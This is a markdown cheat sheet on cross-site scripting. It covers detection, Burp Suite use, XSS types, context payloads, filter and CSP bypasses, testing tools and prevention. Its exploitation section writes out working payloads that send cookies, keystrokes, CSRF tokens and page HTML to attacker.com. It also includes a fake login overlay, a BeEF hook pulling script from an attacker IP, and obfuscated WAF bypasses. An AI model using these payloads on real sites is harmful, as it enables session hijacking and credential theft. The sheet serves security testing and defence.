## Cross-Site Scripting (XSS)

- **What it is**
  - A web vulnerability where attackers can inject malicious JavaScript code into web pages
  - Allows attackers to execute scripts in victims' browsers
  - Circumvents the same-origin policy security mechanism
  - Can lead to session hijacking, credential theft, and account takeover
  - Occurs when user input is improperly sanitized before being reflected in the page

- **How can we identify it**
  - Basic payload tests:
    - `parameter=<script>alert(1)</script>`
    - `parameter=<img src=x onerror=alert(1)>`
    - `parameter="><script>alert(1)</script>`
    - `parameter=javascript:alert(1)`
  - Content type tests:
    - HTML context: `parameter=<img src=1 onerror=alert(1)>`
    - JavaScript context: `parameter=';alert(1);//`
    - Attribute context: `parameter=" onmouseover="alert(1)`
    - URL context: `parameter=javascript:alert(1)`
  - DOM tests:
    - URL fragment: `#<script>alert(1)</script>`
    - Local storage: Check for unfiltered data from localStorage being inserted into DOM
  - Look for reflection of input data in:
    - HTML body
    - HTML attributes
    - JavaScript code
    - CSS properties
    - URL parameters

- **How to use Burp Suite for detection**
  - Capture target request
  - Send to Repeater (Ctrl+R)
  - Modify parameter values with XSS test payloads
  - Analyze responses for unfiltered reflections
  - For automated testing:
    - Send to Intruder (Ctrl+I)
    - Set payload position (§value§)
    - Load XSS payload list
    - Configure payload processing (URL encoding if needed)
    - Start attack and look for successful payload execution
  - Use Burp Scanner:
    - Right-click request and select "Scan this request"
    - Review "Client-side" issues in scan results
    - Examine reported XSS vulnerabilities

- **Types of XSS**
  - **Reflected XSS**
    - Payload is part of the HTTP request
    - Server includes malicious script in immediate response
    - Attack requires victim to click malicious link or submit crafted form
    - Example: `https://vulnerable-site.com/search?q=<script>alert(1)</script>`
    - Detection: Check if input parameters are reflected in the response

  - **Stored XSS**
    - Payload is stored on the target server (database, log files, etc.)
    - Malicious script activates when users view affected page
    - More dangerous as it doesn't require victim interaction with attacker
    - Common in: comments, user profiles, forum posts, product reviews
    - Detection: Submit benign identifier, verify persistence across sessions/users

  - **DOM-based XSS**
    - Vulnerability exists in client-side JavaScript
    - Payload is processed by the DOM environment
    - Server response may be completely benign
    - Commonly exploits: `document.location`, `document.URL`, `document.referrer`
    - Detection: Monitor DOM modifications using browser dev tools
    - Source vs. sink testing (track data flow from sources to sinks)

- **XSS Contexts and Payloads**
  - **HTML Context**
    - Basic: `<script>alert(1)</script>`
    - Tag attributes: `" onmouseover="alert(1)"`
    - Image tags: `<img src=x onerror=alert(1)>`
    - SVG: `<svg onload=alert(1)>`
    - Body tag: `<body onload=alert(1)>`
    - Input fields: `<input autofocus onfocus=alert(1)>`

  - **JavaScript Context**
    - String break: `';alert(1);//`
    - Template literals: `${alert(1)}`
    - JSON injection: `"key":"value","key":alert(1)//"`
    - Event handlers: `onload=alert(1)`
    - Function calls: `function-call(alert(1))`

  - **Attribute Context**
    - Breaking out: `" onmouseover="alert(1)`
    - No quotes needed: `onmouseover=alert(1)`
    - JavaScript URI: `javascript:alert(1)`
    - Data URI: `data:text/html,<script>alert(1)</script>`

  - **CSS Context**
    - Expression: `<style>body{background-image:url('javascript:alert(1)')}</style>`
    - Import: `<style>@import 'javascript:alert(1)';</style>`
    - HEX encoding: `<div style="background:url('&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x31&#x29')"></div>`

- **Exploitation Techniques**
  - **Session Hijacking**
    - `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`
    - `<script>new Image().src="https://attacker.com/steal?cookie="+document.cookie;</script>`
    - `<script>navigator.sendBeacon('https://attacker.com/steal', JSON.stringify({cookies:document.cookie}))</script>`

  - **Keylogging**
    - `<script>document.addEventListener('keypress',function(e){fetch('https://attacker.com/log?key='+e.key)})</script>`
    - `<script>var k='';document.onkeypress=function(e){k+=e.key;if(k.length>10)fetch('https://attacker.com/log?keys='+k).then(()=>k='')}</script>`

  - **Phishing**
    - Fake login forms: `<div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;z-index:1000"><h3>Session expired. Please log in again.</h3><form action="https://attacker.com/steal"><input name="username" placeholder="Username"><input name="password" placeholder="Password" type="password"><button>Login</button></form></div>`
    - Redirects: `<script>window.location='https://evil-site.com/fake-login'</script>`

  - **Content Extraction**
    - CSRF token theft: `<script>fetch('/account').then(r=>r.text()).then(t=>{let match=t.match(/csrf_token value="([^"]+)"/);if(match)fetch('https://attacker.com/steal?token='+match[1])})</script>`
    - Page scraping: `<script>fetch('https://attacker.com/steal',{method:'POST',body:document.documentElement.outerHTML})</script>`

  - **Advanced Exfiltration**
    - WebSockets: `<script>let ws=new WebSocket('wss://attacker.com');ws.onopen=()=>ws.send(document.cookie)</script>`
    - DNS exfiltration: `<script>([...document.cookie].map((c,i)=>fetch('https://'+c+'.'+i+'.attacker.com/'))).catch(()=>{})</script>`
    - Blind XSS frameworks (like XSSHunter)

- **Bypassing XSS Filters**
  - **Tag Bypasses**
    - Case variation: `<ScRiPt>alert(1)</sCrIpT>`
    - Alternate tags: `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`
    - Non-standard tags: `<a href="javascript:alert(1)">Click me</a>`
    - Event handlers: `onmouseover`, `onerror`, `onload`, `onfocus`

  - **Script Content Bypasses**
    - String encoding:
      - HTML entities: `&lt;script&gt;alert(1)&lt;/script&gt;`
      - URL encoding: `%3Cscript%3Ealert(1)%3C/script%3E`
      - Unicode encoding: `\u003Cscript\u003Ealert(1)\u003C/script\u003E`
      - Hex encoding: `\x3Cscript\x3Ealert(1)\x3C/script\x3E`
    - Obfuscation:
      - String splitting: `<script>a='al';b='ert';eval(a+b+'(1)')</script>`
      - fromCharCode: `<script>String.fromCharCode(97,108,101,114,116,40,49,41)</script>`
      - Base64: `<script>eval(atob('YWxlcnQoMSk='))</script>`

  - **WAF Bypass Techniques**
    - Nested expressions: `<scr<script>ipt>alert(1)</scr</script>ipt>`
    - Double encoding: `%253Cscript%253Ealert(1)%253C/script%253E`
    - Alternative expressions:
      - `<script>top["al"+"ert"](1)</script>`
      - `<script>([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ]=!_+!1+!0,ウ=ウ[ネ+ホ+ヌ+セ]+ウ,ミ=ミ[ネ+ホ+ヌ+セ]+ミ,エ=ウ[0]+ウ[1]+ウ[2]+ウ[3],ス=ミ[5]+ミ[6],ホ=([]+[ウ[ネ+ホ+セ]])[10],ア[エ+ス](ホ)()</script>` (JSFuck style)
    - Protocol handlers: `<a href="j&#97;v&#97;script&#x3A;&#97;lert(1)">Click</a>`
    - CSS injection: `<div style="background-image:url(javascript:alert(1))">`

- **Content Security Policy (CSP) Bypasses**
  - **CSP Understanding**
    - Check for policy: `curl -I https://target.com | grep Content-Security-Policy`
    - Analyze policy directives: `script-src`, `object-src`, `base-uri`, etc.
    - Look for unsafe directives: `unsafe-inline`, `unsafe-eval`

  - **Bypass Techniques**
    - JSONP endpoints: `<script src="https://allowed-domain.com/jsonp?callback=alert(1)"></script>`
    - Angular exploitation when allowed: `<div ng-app ng-csp><div ng-click=$event.view.alert(1)>click me</div></div>`
    - DOM clobbering: `<form id=self><input name=message value="alert(1)"></form>`
    - Script gadgets (when libraries are allowed):
      - jQuery: `<div data-toggle="tooltip" data-html="true" title="<script>alert(1)</script>">`
      - React: `<a href="javascript:alert(1)" data-target="react-component">`
    - Iframe sandbox: `<iframe sandbox="allow-scripts allow-same-origin" src="data:text/html,<script>alert(1)</script>"></iframe>`

- **Testing Tools and Frameworks**
  - **XSS Detection Tools**
    - XSStrike: `python xsstrike.py -u "https://target.com/page.php?param=test"`
    - XSSer: `xsser --url "https://target.com/page.php?param=XSS" --auto`
    - KNOXSS (online tool)
    - DalFox: `dalfox url https://target.com/page.php?param=test`

  - **Browser Developer Tools**
    - Monitor DOM modifications using "Elements" panel
    - Set breakpoints on DOM changes
    - Track JavaScript execution in "Sources" panel
    - Use "Network" to monitor outbound data
    - Audit with Lighthouse security checks

  - **Frameworks**
    - BeEF (Browser Exploitation Framework):
      - Hook injection: `<script src="http://attacker-ip:3000/hook.js"></script>`
      - Browser fingerprinting
      - Social engineering modules
      - Keylogging capabilities
      - Network scanning from browser
    - XSSHunter:
      - Blind XSS detection
      - Payload: `"><script src="https://yoursubdomain.xss.ht"></script>`
      - Captures cookies, page screenshots, DOM content

- **Prevention and Remediation**
  - **Input Validation**
    - Whitelist acceptable inputs
    - Validate context-specific data (emails, numbers, usernames)
    - Type conversion before processing
    - Length limitations

  - **Output Encoding**
    - HTML context: Use HTML entity encoding
      - `&`, `<`, `>`, `"`, `'`, `/`
      - JavaScript libraries: DOMPurify, js-xss, sanitize-html
    - JavaScript context: JavaScript string encoding
      - `\'`, `\"`, `\\`, `\n`, `\r`
    - URL context: URL encoding
      - `encodeURIComponent()` in JavaScript
    - CSS context: CSS escaping
      - Backslash escape special characters

  - **Security Headers**
    - Content-Security-Policy (CSP):
      - `Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com;`
      - Nonce-based: `script-src 'nonce-random123'`
      - Hash-based: `script-src 'sha256-hashvalue'`
    - X-XSS-Protection:
      - `X-XSS-Protection: 1; mode=block`
    - X-Content-Type-Options:
      - `X-Content-Type-Options: nosniff`

  - **Framework Protections**
    - React: Use JSX and avoid dangerouslySetInnerHTML
    - Angular: Use [innerText] instead of [innerHTML]
    - Vue: Use v-text instead of v-html
    - Sanitize user content with framework-specific tools
    - Use template engines with auto-escaping (Handlebars, EJS, Pug)

  - **Advanced Protection**
    - Subresource Integrity (SRI):
      - `<script src="https://example.com/script.js" integrity="sha384-hashvalue" crossorigin="anonymous"></script>`
    - Trusted Types API:
      - `Content-Security-Policy: require-trusted-types-for 'script'`
    - Sandboxed iframes:
      - `<iframe sandbox="allow-scripts" src="user-content.html"></iframe>`
    - Feature Policy/Permissions Policy:
      - `Permissions-Policy: geolocation=(), camera=(), microphone=()`

- **XSS in Modern Web Applications**
  - **Single Page Applications (SPAs)**
    - Client-side template injection
    - State management vulnerabilities (Redux, Vuex)
    - Component prop injection
    - Client-side routing issues

  - **Web Components**
    - Shadow DOM isolation bypasses
    - Custom element vulnerabilities
    - HTML import risks

  - **API-based XSS**
    - JSON injection in REST APIs
    - GraphQL query injection
    - JSONP callbacks
    - Cross-origin resource sharing (CORS) misconfigurations

  - **Modern Frameworks**
    - Server-side rendering (SSR) vs. client-side rendering (CSR)
    - Universal/isomorphic JavaScript security
    - Template string injection
    - Prototype pollution leading to XSS
